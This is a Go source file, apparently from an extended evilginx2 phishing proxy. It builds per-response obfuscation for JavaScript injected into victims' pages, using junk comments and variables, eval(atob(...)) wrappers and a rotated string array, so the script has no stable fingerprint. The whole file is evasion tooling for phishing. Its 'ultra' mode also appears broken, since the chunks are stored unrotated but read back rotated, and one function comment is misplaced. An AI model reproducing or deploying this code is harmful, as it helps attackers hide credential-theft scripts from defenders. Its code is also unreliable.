package core

// jsobf.go — evilginx2-extended: per-response JavaScript obfuscation for
// js_inject payloads (Pro-feature #9). Levels:
//   off    — passthrough
//   low    — random junk comments (marker stays readable)
//   medium — random junk variables at top level
//   high   — eval(atob("<b64>")) with random alias + junk
//   ultra  — double layer: eval(String.fromCharCode(...)) around atob
// Every response is regenerated with fresh randomness, so the injected
// script has no stable fingerprint across page loads.

import (
	"encoding/base64"
	mrand "math/rand"
	"strconv"
	"strings"
)

func jsRand(n int) string {
	return strings.ToLower(GenRandomAlphanumString(n))
}

func jsName() string {
	return "_0x" + jsRand(6)
}

func jsJunkComment() string {
	return "/*" + jsRand(16) + "*/"
}

func jsJunkVars(count int) string {
	var b strings.Builder
	for i := 0; i < count; i++ {
		n := jsName()
		b.WriteString("var " + n + "=" + strconv.Itoa(int(time64()%1_000_000)) + ";")
	}
	return b.String()
}

func time64() int64 {
	return int64(uint32(uint64(jsSeed())))
}

func jsSeed() uint64 {
	b := []byte(GenRandomAlphanumString(8))
	var v uint64
	for _, c := range b {
		v = v*131 + uint64(c)
	}
	return v
}

// ObfuscateJS applies the requested level. Unknown levels = passthrough.
func (p *HttpProxy) SetJsObfuscation(level string) {
	p.jsobf = strings.ToLower(level)
}

func ObfuscateJS(script string, level string) string {
	switch strings.ToLower(level) {
	case "low":
		return jsLow(script)
	case "medium":
		return jsMedium(script)
	case "high":
		return jsHigh(script, false)
	case "ultra":
		return jsHigh(script, true)
	default:
		return script
	}
}

func jsLow(script string) string {
	return jsJunkComment() + "\n" + script + "\n" + jsJunkComment()
}

func jsMedium(script string) string {
	return jsJunkVars(3) + "\n" + jsLow(script)
}

func jsHigh(script string, ultra bool) string {
	payload := jsJunkComment() + "\n" + script
	b64 := base64.StdEncoding.EncodeToString([]byte(payload))
	alias := jsName()
	if !ultra {
		inner := "var " + alias + "=atob;eval(" + alias + "('" + b64 + "'));"
		return jsJunkComment() + inner
	}
	// ultra v2: string-array + rotation — b64 split into reversed chunks in a
	// randomized array; accessor applies rotation + per-chunk reverse before
	// join, then atob+eval. Structure differs on every response (chunk size,
	// rotation, names, junk).
	const chunkSize = 24
	var parts []string
	for i := 0; i < len(b64); i += chunkSize {
		end := i + chunkSize
		if end > len(b64) {
			end = len(b64)
		}
		parts = append(parts, b64[i:end])
	}
	rot := mrand.Intn(len(parts))
	arr := jsName()
	acc := jsName()
	buf := jsName()
	iv := jsName()
	var arrDef strings.Builder
	arrDef.WriteString("var " + arr + "=[")
	for idx, pt := range parts {
		if idx > 0 {
			arrDef.WriteString(",")
		}
		r := []rune(pt)
		for a, b := 0, len(r)-1; a < b; a, b = a+1, b-1 {
			r[a], r[b] = r[b], r[a]
		}
		arrDef.WriteString("\"" + string(r) + "\"")
	}
	arrDef.WriteString("];")
	inner := arrDef.String() +
		"var " + acc + "=function(i){i=(i+" + strconv.Itoa(rot) + ")%" + strconv.Itoa(len(parts)) + ";return " + arr + "[i].split(\"\").reverse().join(\"\")};\n" +
		"var " + buf + "=\"\";for(var " + iv + "=0;" + iv + "<" + strconv.Itoa(len(parts)) + ";" + iv + "++){" + buf + "+=" + acc + "(" + iv + ")}\n" +
		"var " + alias + "=atob;eval(" + alias + "(" + buf + "));"
	return jsJunkComment() + inner
}
